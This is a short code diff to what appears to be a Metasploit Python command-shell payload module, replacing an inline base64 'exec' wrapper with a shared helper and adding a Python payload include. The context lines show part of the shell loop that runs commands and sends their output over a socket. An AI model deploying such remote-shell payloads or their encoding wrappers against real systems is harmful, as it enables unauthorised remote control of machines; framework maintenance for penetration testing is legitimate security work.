@@ -12,6 +12,7 @@ module MetasploitModule
   CachedSize = 561
 
   include Msf::Payload::Single
+  include Msf::Payload::Python
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
@@ -60,10 +61,7 @@ module MetasploitModule
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
     cmd += "\ts.sendall(stdout_value)\n"
 
-    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
-    cmd = "exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))"
-
-    cmd
+    py_create_exec_stub(cmd)
   end
 end
 
